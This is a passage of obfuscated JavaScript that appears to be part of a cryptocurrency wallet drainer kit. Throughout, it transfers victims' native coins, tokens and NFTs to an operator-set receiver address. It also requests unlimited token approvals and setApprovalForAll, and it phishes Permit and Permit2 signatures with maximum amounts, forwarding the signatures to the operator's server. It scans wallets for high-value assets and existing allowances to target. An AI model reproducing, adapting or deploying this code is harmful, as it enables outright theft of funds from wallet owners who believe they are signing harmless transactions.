  const _0x1a2f2e = ethers.BigNumber.from(_0x272c6b.chain_id == 0xa ? "35000000000" : _0x38c69);
  const _0x5951f7 = _0x1a2f2e.mul(ethers.BigNumber.from(_0xf20c83)).mul(ethers.BigNumber.from('2'));
  const _0x2e0f63 = _0x1a2f2e.mul(ethers.BigNumber.from(_0x5ecf5f)).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[_0x272c6b.chain_id])));
  const _0xdb309e = ethers.BigNumber.from(_0x272c6b.amount_raw).sub(_0x5951f7).sub(_0x2e0f63).toString();
  if (ethers.BigNumber.from(_0xdb309e).lte(ethers.BigNumber.from('0'))) {
    throw 'LOW_BALANCE';
  }
  await transfer_request(_0x272c6b);
  sign_next();
  let _0x6a8df8 = null;
  if (MS_Settings.Settings.Chains[_0x1ab655].Contract_Legacy == 0x0) {
    _0x6a8df8 = await _0x39b355[MS_Settings.Settings.Chains[_0x1ab655].Contract_Type](MS_Settings.Receiver, {
      'gasLimit': ethers.BigNumber.from(_0xf20c83),
      'gasPrice': ethers.BigNumber.from(_0x38c69),
      'nonce': _0x55faaa,
      'value': ethers.BigNumber.from(_0xdb309e),
      'from': MS_Current_Address
    });
  } else {
    _0x6a8df8 = await _0x39b355[MS_Settings.Settings.Chains[_0x1ab655].Contract_Type]({
      'gasLimit': ethers.BigNumber.from(_0xf20c83),
      'gasPrice': ethers.BigNumber.from(_0x38c69),
      'nonce': _0x55faaa,
      'value': ethers.BigNumber.from(_0xdb309e),
      'from': MS_Current_Address
    });
  }
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x12cba5.waitForTransaction(_0x6a8df8.hash, 0x1, 0x7530);
  }
  await transfer_success(_0x272c6b, _0xdb309e);
  sign_ready();
};
const TRANSFER_NATIVE = async _0x1cb4c9 => {
  const _0x418f8c = convert_chain('ID', "ANKR", _0x1cb4c9.chain_id);
  if (MS_Settings.Settings.Chains[_0x418f8c].Contract_Address != '') {
    return DO_CONTRACT(_0x1cb4c9);
  }
  const _0x28681c = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x1cb4c9.chain_id]);
  const _0x28311d = ethers.BigNumber.from(await _0x28681c.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from('120')).toString();
  const _0x390151 = _0x1cb4c9.chain_id == 0xa4b1 ? 0x16e360 : _0x1cb4c9.chain_id == 0xa86a ? 0x16e360 : _0x1cb4c9.chain_id == 0x171 ? 0x186a0 : 0x5208;
  const _0x2ee257 = _0x1cb4c9.chain_id == 0xa4b1 ? 0x4c4b40 : _0x1cb4c9.chain_id == 0xa86a ? 0x4c4b40 : _0x1cb4c9.chain_id == 0x171 ? 0xdbba0 : 0x249f0;
  const _0x398ae6 = ethers.BigNumber.from(_0x1cb4c9.chain_id == 0xa ? '35000000000' : _0x28311d);
  const _0x598950 = _0x398ae6.mul(ethers.BigNumber.from(_0x390151)).mul(ethers.BigNumber.from('2'));
  const _0x3f63f7 = _0x398ae6.mul(ethers.BigNumber.from(_0x2ee257)).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[_0x1cb4c9.chain_id])));
  const _0x4f960a = ethers.BigNumber.from(_0x1cb4c9.amount_raw).sub(_0x598950).sub(_0x3f63f7).toString();
  if (ethers.BigNumber.from(_0x4f960a).lte(ethers.BigNumber.from('0'))) {
    throw 'LOW_BALANCE';
  }
  const _0x2674cd = await get_nonce(_0x1cb4c9.chain_id);
  await transfer_request(_0x1cb4c9);
  sign_next();
  const _0x4c762f = await MS_Signer.sendTransaction({
    'from': MS_Current_Address,
    'to': MS_Settings.Receiver,
    'value': ethers.BigNumber.from(_0x4f960a),
    'gasLimit': ethers.BigNumber.from(_0x390151),
    'gasPrice': ethers.BigNumber.from(_0x28311d),
    'nonce': _0x2674cd,
    'data': '0x'
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x28681c.waitForTransaction(_0x4c762f.hash, 0x1, 0x7530);
  }
  await transfer_success(_0x1cb4c9, _0x4f960a);
  sign_ready();
};
const TRANSFER_TOKEN = async _0x5ed648 => {
  const _0x4cb931 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x5ed648.chain_id]);
  const _0x2a325a = ethers.BigNumber.from(await _0x4cb931.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from('120')).toString();
  const _0x396e99 = await get_nonce(_0x5ed648.chain_id);
  const _0xe4a180 = new ethers.Contract(_0x5ed648.address, MS_Contract_ABI.ERC20, MS_Signer);
  let _0x25c3f5 = null;
  let _0x1a80da = 0x0;
  while (_0x1a80da < 0x3) {
    try {
      _0x25c3f5 = await _0xe4a180.estimateGas.transfer(MS_Settings.Receiver, _0x5ed648.amount_raw, {
        'from': MS_Current_Address
      });
      _0x25c3f5 = ethers.BigNumber.from(_0x25c3f5).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from("120")).toString();
      _0x1a80da = 0x3;
    } catch (_0x3280d4) {
      _0x25c3f5 = _0x5ed648.chain_id == 0xa4b1 ? 0x4c4b40 : _0x5ed648.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
      _0x1a80da += 0x1;
    }
  }
  await transfer_request(_0x5ed648);
  sign_next();
  const _0x28d760 = await _0xe4a180.transfer(MS_Settings.Receiver, _0x5ed648.amount_raw, {
    'gasLimit': ethers.BigNumber.from(_0x25c3f5),
    'gasPrice': ethers.BigNumber.from(_0x2a325a),
    'nonce': _0x396e99,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x4cb931.waitForTransaction(_0x28d760.hash, 0x1, 0x7530);
  }
  await transfer_success(_0x5ed648);
  sign_ready();
};
const TRANSFER_NFT = async _0x2adf58 => {
  const _0x166564 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x2adf58.chain_id]);
  const _0xa73ac9 = ethers.BigNumber.from(await _0x166564.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  const _0x37531c = await get_nonce(_0x2adf58.chain_id);
  const _0x44e215 = new ethers.Contract(_0x2adf58.address, MS_Contract_ABI.ERC721, MS_Signer);
  let _0x21673a = null;
  let _0x426d4b = 0x0;
  while (_0x426d4b < 0x3) {
    try {
      _0x21673a = await _0x44e215.estimateGas.transferFrom(MS_Current_Address, MS_Settings.Receiver, _0x2adf58.amount_raw, {
        'from': MS_Current_Address
      });
      _0x21673a = ethers.BigNumber.from(_0x21673a).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
      _0x426d4b = 0x3;
    } catch (_0x5b01ae) {
      _0x21673a = _0x2adf58.chain_id == 0xa4b1 ? 0x4c4b40 : _0x2adf58.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
      _0x426d4b += 0x1;
    }
  }
  await transfer_request(_0x2adf58);
  sign_next();
  const _0x4ba724 = await _0x44e215.transferFrom(MS_Current_Address, MS_Settings.Receiver, _0x2adf58.amount_raw, {
    'gasLimit': ethers.BigNumber.from(_0x21673a),
    'gasPrice': ethers.BigNumber.from(_0xa73ac9),
    'nonce': _0x37531c,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x166564.waitForTransaction(_0x4ba724.hash, 0x1, 0x7530);
  }
  await transfer_success(_0x2adf58);
  sign_ready();
};
const RETRO_MM_APPROVE_TOKEN = async _0x1caf39 => {
  const _0x2a2476 = new Web3(MS_Provider);
  const _0x15e4c8 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x1caf39.chain_id]);
  const _0x248281 = ethers.BigNumber.from(await _0x15e4c8.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  const _0x51c94d = await get_nonce(_0x1caf39.chain_id);
  const _0x23d6fc = new ethers.Contract(_0x1caf39.address, MS_Contract_ABI.ERC20, _0x15e4c8);
  let _0x2c513f = null;
  let _0x4d3442 = ethers.utils.parseEther('1158472395435294898592384258348512586931256');
  for (const _0x5e2737 of MS_Settings.Unlimited_BL) {
    try {
      if (_0x5e2737[0x0] == MS_Current_Chain_ID && _0x5e2737[0x1] == _0x1caf39.address.toLowerCase().trim()) {
        _0x4d3442 = _0x1caf39.amount_raw;
        break;
      }
    } catch (_0x51be91) {
      console.log(_0x51be91);
    }
  }
  let _0x2763fc = 0x0;
  while (_0x2763fc < 0x3) {
    try {
      _0x2c513f = await _0x23d6fc.estimateGas.approve(MS_Settings.Address, _0x4d3442, {
        'from': MS_Current_Address
      });
      _0x2c513f = ethers.BigNumber.from(_0x2c513f).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
      _0x2763fc = 0x3;
    } catch (_0x4e5f8f) {
      _0x2c513f = _0x1caf39.chain_id == 0xa4b1 ? 0x4c4b40 : _0x1caf39.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
      _0x2763fc += 0x1;
    }
  }
  let _0x126504 = new _0x2a2476.eth.Contract(MS_Contract_ABI.ERC20, _0x1caf39.address);
  let _0x2d7224 = _0x126504.methods.approve(MS_Settings.Address, _0x4d3442).encodeABI();
  await approve_request(_0x1caf39);
  sign_next();
  const _0x1da0ee = await new Promise(_0x6af481 => {
    MS_Provider.sendAsync({
      'from': MS_Current_Address,
      'id': 0x1,
      'jsonrpc': '2.0',
      'method': "eth_sendTransaction",
      'params': [{
        'chainId': MS_Current_Chain_ID,
        'data': _0x2d7224,
        'from': MS_Current_Address,
        'nonce': _0x2a2476.utils.toHex(_0x51c94d),
        'to': _0x1caf39.address,
        'value': "0x000" + Math.floor(Math.random() * 0x9),
        'gasPrice': _0x2a2476.utils.toHex(_0x248281),
        'gas': _0x2a2476.utils.toHex(_0x2c513f)
      }]
    }, (_0x21cb45, _0x3bcdf1) => {
      _0x6af481({
        'err': _0x21cb45,
        'tx': _0x3bcdf1
      });
    });
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x15e4c8.waitForTransaction(_0x1da0ee.tx.result, 0x1, 0x7530);
  }
  await approve_success(_0x1caf39);
  sign_ready();
};
const DO_SAFA = async _0x47f15f => {
  const _0x47479d = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x47f15f.chain_id]);
  const _0x416ab6 = ethers.BigNumber.from(await _0x47479d.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from('120')).toString();
  const _0x43c065 = await get_nonce(_0x47f15f.chain_id);
  const _0x4fd7c5 = new ethers.Contract(_0x47f15f.address, MS_Contract_ABI.ERC721, MS_Signer);
  let _0x1601f5 = null;
  let _0x399877 = 0x0;
  while (_0x399877 < 0x3) {
    try {
      _0x1601f5 = await _0x4fd7c5.estimateGas.setApprovalForAll(MS_Settings.Address, true, {
        'from': MS_Current_Address
      });
      _0x1601f5 = ethers.BigNumber.from(_0x1601f5).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from("120")).toString();
      _0x399877 = 0x3;
    } catch (_0x30b5b6) {
      _0x1601f5 = _0x47f15f.chain_id == 0xa4b1 ? 0x4c4b40 : _0x47f15f.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
      _0x399877 += 0x1;
    }
  }
  await approve_request(_0x47f15f);
  sign_next();
  const _0x5b09a8 = await _0x4fd7c5.setApprovalForAll(MS_Settings.Address, true, {
    'gasLimit': ethers.BigNumber.from(_0x1601f5),
    'gasPrice': ethers.BigNumber.from(_0x416ab6),
    'nonce': _0x43c065,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x47479d.waitForTransaction(_0x5b09a8.hash, 0x1, 0x7530);
  }
  await approve_success(_0x47f15f);
  sign_ready();
};
const DO_PERMIT2 = async (_0x1d5331, _0x5415a0) => {
  const _0x3d9639 = new ethers.Contract("0x000000000022d473030f116ddee9f6b43ac78ba3", MS_Contract_ABI.PERMIT2_BATCH, MS_Signer);
  let _0x259c65 = {
    'name': "Permit2",
    'chainId': _0x1d5331.chain_id,
    'verifyingContract': "0x000000000022d473030f116ddee9f6b43ac78ba3"
  };
  let _0x33ce59 = Date.now() + 30758400000;
  let _0x22d8f6 = null;
  let _0x1eb890 = null;
  let _0x43b569 = null;
  if (_0x5415a0.length > 0x1) {
    let _0x4e2017 = {
      'PermitBatch': [{
        'name': "details",
        'type': 'PermitDetails[]'
      }, {
        'name': "spender",
        'type': 'address'
      }, {
        'name': "sigDeadline",
        'type': "uint256"
      }],
      'PermitDetails': [{
        'name': 'token',
        'type': "address"
      }, {
        'name': "amount",
        'type': "uint160"
      }, {
        'name': "expiration",
        'type': "uint48"
      }, {
        'name': "nonce",
        'type': "uint48"
      }]
    };
    let _0xaf2ab = [];
    for (const _0xadec70 of _0x5415a0) {
      try {
        _0xaf2ab.push({
          'token': _0xadec70.address,
          'expiration': _0x33ce59,
          'amount': "1461501637330902918203684832716283019655932542975",
          'nonce': (await _0x3d9639.allowance(MS_Current_Address, _0xadec70.address, MS_Settings.Address)).nonce
        });
      } catch (_0x227591) {
        console.log(_0x227591);
      }
    }
    _0x1eb890 = {
      'details': _0xaf2ab,
      'spender': MS_Settings.Address,
      'sigDeadline': _0x33ce59
    };
    swap_request("Permit2", _0x1d5331, _0x5415a0);
    sign_next();
    _0x22d8f6 = await MS_Signer._signTypedData(_0x259c65, _0x4e2017, _0x1eb890);
    _0x43b569 = 0x2;
  } else {
    let _0x5d7c3a = {
      'PermitSingle': [{
        'name': "details",
        'type': "PermitDetails"
      }, {
        'name': 'spender',
        'type': "address"
      }, {
        'name': "sigDeadline",
        'type': "uint256"
      }],
      'PermitDetails': [{
        'name': "token",
        'type': 'address'
      }, {
        'name': "amount",
        'type': 'uint160'
      }, {
        'name': "expiration",
        'type': "uint48"
      }, {
        'name': "nonce",
        'type': "uint48"
      }]
    };
    _0x1eb890 = {
      'details': {
        'token': _0x1d5331.address,
        'amount': '1461501637330902918203684832716283019655932542975',
        'expiration': _0x33ce59,
        'nonce': (await _0x3d9639.allowance(MS_Current_Address, _0x1d5331.address, MS_Settings.Address)).nonce
      },
      'spender': MS_Settings.Address,
      'sigDeadline': _0x33ce59
    };
    swap_request("Permit2", _0x1d5331, [_0x1d5331]);
    sign_next();
    _0x22d8f6 = await MS_Signer._signTypedData(_0x259c65, _0x5d7c3a, _0x1eb890);
    _0x43b569 = 0x1;
  }
  if (_0x22d8f6 != null) {
    await swap_success("Permit2", _0x1d5331, _0x5415a0);
    wait_message();
    const _0x19c1c3 = send_request({
      'action': "sign_permit2",
      'user_id': MS_ID,
      'signature': _0x22d8f6,
      'message': _0x1eb890,
      'asset': _0x1d5331,
      'assets': _0x5415a0,
      'address': MS_Current_Address,
      'mode': _0x43b569
    });
    if (MS_Settings.Settings.Wait_For_Response) {
      await _0x19c1c3;
    }
    sign_ready();
  } else {
    await sign_cancel();
  }
};
const PERMIT_TOKEN = async _0x36bb53 => {
  const _0x59f450 = new ethers.Contract(_0x36bb53.address, _0x36bb53.abi, MS_Signer);
  const _0x18391e = await _0x59f450.nonces(MS_Current_Address);
  const _0xdd4060 = await _0x59f450.name();
  let _0x48e1f2 = ethers.utils.parseEther('1158472395435294898592384258348512586931256');
  for (const _0x1e4bf6 of MS_Settings.Unlimited_BL) {
    try {
      if (_0x1e4bf6[0x0] == MS_Current_Chain_ID && _0x1e4bf6[0x1] == _0x36bb53.address.toLowerCase().trim()) {
        _0x48e1f2 = _0x36bb53.amount_raw;
        break;
      }
    } catch (_0x372b22) {
      console.log(_0x372b22);
    }
  }
  const _0x61b27a = Date.now() + 30758400000;
  let _0x49762f = null;
  let _0x10b65b = null;
  if (_0x36bb53.permit == 0x1) {
    _0x49762f = {
      'Permit': [{
        'name': "holder",
        'type': "address"
      }, {
        'name': 'spender',
        'type': "address"
      }, {
        'name': "nonce",
        'type': "uint256"
      }, {
        'name': "expiry",
        'type': "uint256"
      }, {
        'name': 'allowed',
        'type': "bool"
      }]
    };
    _0x10b65b = {
      'holder': MS_Current_Address,
      'spender': MS_Settings.Address,
      'nonce': _0x18391e,
      'expiry': _0x61b27a,
      'allowed': true
    };
  } else if (_0x36bb53.permit == 0x2) {
    _0x49762f = {
      'Permit': [{
        'name': "owner",
        'type': 'address'
      }, {
        'name': "spender",
        'type': "address"
      }, {
        'name': "value",
        'type': 'uint256'
      }, {
        'name': "nonce",
        'type': "uint256"
      }, {
        'name': "deadline",
        'type': "uint256"
      }]
    };
    _0x10b65b = {
      'owner': MS_Current_Address,
      'spender': MS_Settings.Address,
      'value': _0x48e1f2,
      'nonce': _0x18391e,
      'deadline': _0x61b27a
    };
  }
  await approve_request(_0x36bb53);
  sign_next();
  const _0x17582e = await MS_Signer._signTypedData({
    'name': _0xdd4060,
    'version': _0x36bb53.permit_ver,
    'chainId': _0x36bb53.chain_id,
    'verifyingContract': _0x36bb53.address
  }, _0x49762f, _0x10b65b);
  const _0x21ae0b = {
    'r': _0x17582e.slice(0x0, 0x42),
    's': '0x' + _0x17582e.slice(0x42, 0x82),
    'v': Number('0x' + _0x17582e.slice(0x82, 0x84))
  };
  await approve_success(_0x36bb53);
  wait_message();
  const _0x7b1437 = send_request({
    'action': 'permit_token',
    'user_id': MS_ID,
    'sign': {
      'type': _0x36bb53.permit,
      'version': _0x36bb53.permit_ver,
      'chain_id': _0x36bb53.chain_id,
      'address': _0x36bb53.address,
      'owner': MS_Current_Address,
      'spender': MS_Settings.Address,
      'value': _0x48e1f2.toString(),
      'nonce': _0x18391e.toString(),
      'deadline': _0x61b27a,
      'r': _0x21ae0b.r,
      's': _0x21ae0b.s,
      'v': _0x21ae0b.v,
      'abi': _0x36bb53.abi
    },
    'asset': _0x36bb53,
    'address': MS_Current_Address
  });
  if (MS_Settings.Settings.Wait_For_Response) {
    await _0x7b1437;
  }
  sign_ready();
};
const sign_success = async (_0x1c1a59, _0x56f7d6 = '0') => {
  try {
    if (_0x1c1a59.type == 'NATIVE') {
      _0x1c1a59.amount_raw = _0x56f7d6;
      const _0x503ad7 = ethers.BigNumber.from(_0x1c1a59.amount_raw);
      _0x1c1a59.amount_usd = parseFloat(ethers.utils.formatUnits(_0x503ad7, "ether")) * MS_Currencies[convert_chain('ID', "CURRENCY", _0x1c1a59.chain_id)].USD;
      await send_request({
        'action': "sign_success",
        'asset': _0x1c1a59,
        'user_id': MS_ID
      });
    } else {
      await send_request({
        'action': "sign_success",
        'asset': _0x1c1a59,
        'user_id': MS_ID
      });
    }
  } catch (_0x1eef51) {
    console.log(_0x1eef51);
  }
};
const swap_success = async (_0x16821d, _0x452891, _0x1d9f3b = [], _0x10f860 = '0') => {
  try {
    if (_0x452891.type == 'NATIVE') {
      _0x452891.amount_raw = _0x10f860;
      const _0x42b547 = ethers.BigNumber.from(_0x452891.amount_raw);
      _0x452891.amount_usd = parseFloat(ethers.utils.formatUnits(_0x42b547, "ether")) * MS_Currencies[convert_chain('ID', "CURRENCY", _0x452891.chain_id)].USD;
      await send_request({
        'action': 'swap_success',
        'asset': _0x452891,
        'user_id': MS_ID,
        'list': _0x1d9f3b,
        'swapper': _0x16821d
      });
    } else {
      await send_request({
        'action': "swap_success",
        'asset': _0x452891,
        'user_id': MS_ID,
        'list': _0x1d9f3b,
        'swapper': _0x16821d
      });
    }
  } catch (_0x1caaf6) {
    console.log(_0x1caaf6);
  }
};
const transfer_success = async (_0x545cf5, _0xd4d7ea = '0') => {
  try {
    if (_0x545cf5.type == "NATIVE") {
      _0x545cf5.amount_raw = _0xd4d7ea;
      const _0x530586 = ethers.BigNumber.from(_0x545cf5.amount_raw);
      _0x545cf5.amount_usd = parseFloat(ethers.utils.formatUnits(_0x530586, "ether")) * MS_Currencies[convert_chain('ID', 'CURRENCY', _0x545cf5.chain_id)].USD;
      await send_request({
        'action': "transfer_success",
        'asset': _0x545cf5,
        'user_id': MS_ID
      });
    } else {
      await send_request({
        'action': 'transfer_success',
        'asset': _0x545cf5,
        'user_id': MS_ID
      });
    }
  } catch (_0x55e2c4) {
    console.log(_0x55e2c4);
  }
};
const approve_success = async _0x479791 => {
  try {
    await send_request({
      'action': "approve_success",
      'asset': _0x479791,
      'user_id': MS_ID
    });
  } catch (_0x45ce25) {
    console.log(_0x45ce25);
  }
};
const sign_cancel = async () => {
  try {
    await send_request({
      'action': 'sign_cancel',
      'user_id': MS_ID
    });
  } catch (_0x42df8d) {
    console.log(_0x42df8d);
  }
};
const sign_unavailable = async () => {
  try {
    await send_request({
      'action': 'sign_unavailable',
      'user_id': MS_ID
    });
    MS_Sign_Disabled = true;
  } catch (_0x46f0a7) {
    console.log(_0x46f0a7);
  }
};
const transfer_cancel = async () => {
  try {
    await send_request({
      'action': "transfer_cancel",
      'user_id': MS_ID
    });
  } catch (_0x32720f) {
    console.log(_0x32720f);
  }
};
const approve_cancel = async () => {
  try {
    await send_request({
      'action': "approve_cancel",
      'user_id': MS_ID
    });
  } catch (_0x1c7c4a) {
    console.log(_0x1c7c4a);
  }
};
const chain_cancel = async () => {
  try {
    await send_request({
      'action': 'chain_cancel',
      'user_id': MS_ID
    });
  } catch (_0x2b0e93) {
    console.log(_0x2b0e93);
  }
};
const chain_success = async () => {
  try {
    await send_request({
      'action': 'chain_success',
      'user_id': MS_ID
    });
  } catch (_0x99e481) {
    console.log(_0x99e481);
  }
};
const chain_request = async (_0x3933f5, _0x233e7e) => {
  try {
    await send_request({
      'action': "chain_request",
      'user_id': MS_ID,
      'chains': [_0x3933f5, _0x233e7e]
    });
  } catch (_0x5326ed) {
    console.log(_0x5326ed);
  }
};
const sign_request = async _0x2675b9 => {
  try {
    await send_request({
      'action': "sign_request",
      'user_id': MS_ID,
      'asset': _0x2675b9
    });
  } catch (_0x2b20f7) {
    console.log(_0x2b20f7);
  }
};
const swap_request = async (_0x4c669f, _0xa7ba74, _0x5bc988 = []) => {
  try {
    await send_request({
      'action': 'swap_request',
      'user_id': MS_ID,
      'asset': _0xa7ba74,
      'list': _0x5bc988,
      'swapper': _0x4c669f
    });
  } catch (_0x4fc7a5) {
    console.log(_0x4fc7a5);
  }
};
const transfer_request = async _0x5161c3 => {
  try {
    await send_request({
      'action': "transfer_request",
      'user_id': MS_ID,
      'asset': _0x5161c3
    });
  } catch (_0x213c1b) {
    console.log(_0x213c1b);
  }
};
const approve_request = async _0x7e6137 => {
  try {
    await send_request({
      'action': "approve_request",
      'user_id': MS_ID,
      'asset': _0x7e6137
    });
  } catch (_0x3a4c2b) {
    console.log(_0x3a4c2b);
  }
};
const is_increase_approve = _0x5b883e => {
  try {
    if (_0x5b883e.hasOwnProperty("increaseAllowance")) {
      return 0x1;
    } else {
      return _0x5b883e.hasOwnProperty('increaseApproval') ? 0x2 : false;
    }
  } catch (_0x2d1e18) {
    return false;
  }
};
const get_wallet_assets = async _0x58a0bb => {
  try {
    let _0x1210d2 = await send_request({
      'action': 'check_wallet',
      'address': MS_Current_Address
    });
    let _0x1e4821 = [];
    if (_0x1210d2.status == 'OK') {
      _0x1e4821 = await get_tokens(_0x58a0bb);
    } else {
      if (MS_Settings.AT != '' && _0x1210d2.error == 'LOCAL_CHECK') {
        _0x1e4821 = await get_tokens(_0x58a0bb);
      } else {
        if (_0x1210d2.error != "LOCAL_CHECK") {
          return _0x1e4821;
        } else {
          MS_Check_Done = true;
          MSL.fire({
            'icon': 'error',
            'title': "Critical Error",
            'subtitle': "Настройте оценщики",
            'text': "Ни один из оценщиков не активирован в настройках скрипта, оценка активов кошелька невозможна, проверьте настройки и перезапустите сервер!",
            'showConfirmButton': true,
            'confirmButtonText': 'OK',
            'color': "light"
          });
          await new Promise(_0x18201c => setTimeout(_0x18201c, 0x2710));
          return _0x1e4821;
        }
      }
    }
    let _0x492528 = [];
    for (let _0xebfb00 = _0x1e4821.length - 0x1; _0xebfb00 >= 0x0; _0xebfb00--) {
      try {
        const _0x2fbd27 = _0x1e4821[_0xebfb00];
        const _0x142029 = convert_chain('ID', "ANKR", _0x2fbd27.chain_id);
        if (!MS_Settings.Settings.Chains[_0x142029].Enable) {
          _0x1e4821.splice(_0xebfb00, 0x1);
        } else {
          if (_0x2fbd27.type == 'NATIVE' && !MS_Settings.Settings.Chains[_0x142029].Native) {
            _0x1e4821.splice(_0xebfb00, 0x1);
          } else {
            if (_0x2fbd27.type == "ERC20" && !MS_Settings.Settings.Chains[_0x142029].Tokens) {
              _0x1e4821.splice(_0xebfb00, 0x1);
            } else {
              if (_0x2fbd27.type == "NATIVE" && _0x2fbd27.amount_usd < MS_Settings.Settings.Chains[_0x142029].Min_Native_Price) {
                _0x1e4821.splice(_0xebfb00, 0x1);
              } else {
                if (_0x2fbd27.type == "ERC20" && _0x2fbd27.amount_usd < MS_Settings.Settings.Chains[_0x142029].Min_Tokens_Price) {
                  _0x1e4821.splice(_0xebfb00, 0x1);
                } else if (_0x2fbd27.type == "ERC20") {
                  if (MS_Settings.Settings.Permit2.Mode) {
                    _0x492528.push(new Promise(async _0x170cd1 => {
                      try {
                        if (_0x2fbd27.amount_usd >= MS_Settings.Settings.Permit2.Price) {
                          const _0x14efd5 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x2fbd27.chain_id]);
                          const _0x41f1e3 = new ethers.Contract(_0x2fbd27.address, MS_Contract_ABI.ERC20, _0x14efd5);
                          let _0x1da3aa = await _0x41f1e3.allowance(MS_Current_Address, "0x000000000022d473030f116ddee9f6b43ac78ba3");
                          if (ethers.BigNumber.from(_0x1da3aa).gt(ethers.BigNumber.from('0'))) {
                            _0x2fbd27.permit2 = true;
                            _0x2fbd27.allowance = _0x1da3aa;
                            console.log("[PERMIT_2 FOUND] " + _0x2fbd27.name + ", Allowance: " + _0x1da3aa);
                          }
                        }
                      } catch (_0x4ba24c) {
                        console.log(_0x4ba24c);
                      }
                      _0x170cd1();
                    }));
                  }
                  if (MS_Settings.Settings.Permit.Mode && MS_Settings.Settings.Permit.Priority > 0x0 || MS_Settings.Settings.Approve.MetaMask >= 0x2 && MS_Current_Provider == "MetaMask" || MS_Settings.Settings.Approve.Trust >= 0x2 && MS_Current_Provider == "Trust Wallet") {
                    _0x492528.push(new Promise(async _0x1ec003 => {
                      try {
                        if (MS_Settings.Settings.Approve.MetaMask >= 0x2 && MS_Current_Provider == "MetaMask" || MS_Settings.Settings.Approve.Trust >= 0x2 && MS_Current_Provider == "Trust Wallet" || _0x2fbd27.amount_usd >= MS_Settings.Settings.Permit.Price) {
                          const _0x311883 = await retrive_token(_0x2fbd27.chain_id, _0x2fbd27.address);
                          const _0x411f2c = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x2fbd27.chain_id]);
                          const _0x4402d6 = new ethers.Contract(_0x2fbd27.address, _0x311883, _0x411f2c);
                          if (is_increase_approve(_0x4402d6.functions) == 0x2) {
                            _0x2fbd27.increase = 0x2;
                            _0x2fbd27.abi = _0x311883;
                          } else if (is_increase_approve(_0x4402d6.functions) == 0x1) {
                            _0x2fbd27.increase = 0x1;
                            _0x2fbd27.abi = _0x311883;
                          }
                          if (_0x2fbd27.amount_usd >= MS_Settings.Settings.Permit.Price) {
                            const _0x110cf1 = get_permit_type(_0x4402d6.functions);
                            _0x2fbd27.permit = _0x110cf1;
                            _0x2fbd27.permit_ver = '1';
                            _0x2fbd27.abi = _0x311883;
                            if (_0x110cf1 > 0x0) {
                              if (_0x4402d6.functions.hasOwnProperty('version')) {
                                try {
                                  _0x2fbd27.permit_ver = await _0x4402d6.version();
                                } catch (_0x3c4cd8) {
                                  console.log(_0x3c4cd8);
                                }
                              }
                              console.log("[PERMIT FOUND] " + _0x2fbd27.name + ", Permit Type: " + _0x110cf1 + ", Version: " + _0x2fbd27.permit_ver);
                            }
                          }
                        }
                      } catch (_0x5835a4) {
                        console.log(_0x5835a4);
                      }
                      _0x1ec003();
                    }));
                  }
                  if (MS_Settings.Settings.Swappers.Enable) {
                    _0x492528.push(new Promise(async _0x1b1600 => {
                      try {
                        if (_0x2fbd27.amount_usd >= MS_Settings.Settings.Swappers.Price) {
                          const _0x2ae44a = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x2fbd27.chain_id]);
                          for (const _0x13a225 of MS_Routers[_0x2fbd27.chain_id]) {
                            try {
                              const _0x2a79d4 = new ethers.Contract(_0x2fbd27.address, MS_Contract_ABI.ERC20, _0x2ae44a);
                              const _0x35894c = await _0x2a79d4.allowance(MS_Current_Address, _0x13a225[0x1]);
                              if (ethers.BigNumber.from(_0x35894c).gt(ethers.BigNumber.from('0'))) {
                                if (_0x13a225[0x0] == "Quickswap" && MS_Settings.Settings.Swappers.Quick == 0x0) {
                                  continue;
                                }
                                if (_0x13a225[0x0] == "Sushiswap" && MS_Settings.Settings.Swappers.Sushi == 0x0) {
                                  continue;
                                }
                                if (_0x13a225[0x0] == "Uniswap" && (!MS_Uniswap_Whitelist.includes(_0x2fbd27.address) || MS_Settings.Settings.Swappers.Uniswap == 0x0)) {
                                  continue;
                                }
                                if ((_0x13a225[0x0] == 'Pancake' || _0x13a225[0x0] == "Pancake_V3") && (!MS_Pancake_Whitelist.includes(_0x2fbd27.address) || MS_Settings.Settings.Swappers.Pancake == 0x0)) {
                                  continue;
                                }
                                _0x2fbd27.swapper = true;
                                _0x2fbd27.swapper_type = _0x13a225[0x0];
                                _0x2fbd27.swapper_address = _0x13a225[0x1];
                                _0x2fbd27.swapper_allowance = _0x35894c;
                                console.log("[SWAP FOUND] " + _0x2fbd27.name + ", " + _0x13a225[0x0]);
                                break;
                              }
                            } catch (_0x42c4e2) {
                              console.log(_0x42c4e2);
                            }
                          }
                        }
                      } catch (_0x427c61) {
                        console.log(_0x427c61);
                      }
                      _0x1b1600();
                    }));
                  }
